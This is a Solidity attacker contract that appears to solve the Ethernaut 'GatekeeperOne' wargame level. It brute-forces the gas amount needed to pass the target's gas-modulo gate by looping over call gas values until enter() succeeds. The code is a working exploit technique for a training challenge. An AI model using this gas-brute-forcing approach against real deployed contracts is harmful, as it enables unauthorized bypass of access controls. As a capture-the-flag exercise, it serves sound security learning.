// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {

  IGateKeeperOne gateKeeperOneContract;

  uint256 public requiredGas;
  bool public foundNumber = false;

  constructor(address _gateKeeperOneContract) {
    gateKeeperOneContract = IGateKeeperOne(_gateKeeperOneContract);
  }

  function estimateGasForGateTwo() external {
    bytes8 key = bytes8(uint64(0));
    for(uint256 i = 1; i < 1000; i++) {
      try gateKeeperOneContract.enter{ gas : 8191 * 10 + i}(key) {
          requiredGas = i;  // 426 seems to be good number
          foundNumber = true;
          return;
      } catch {}
    }
    revert("All failed");
  }

}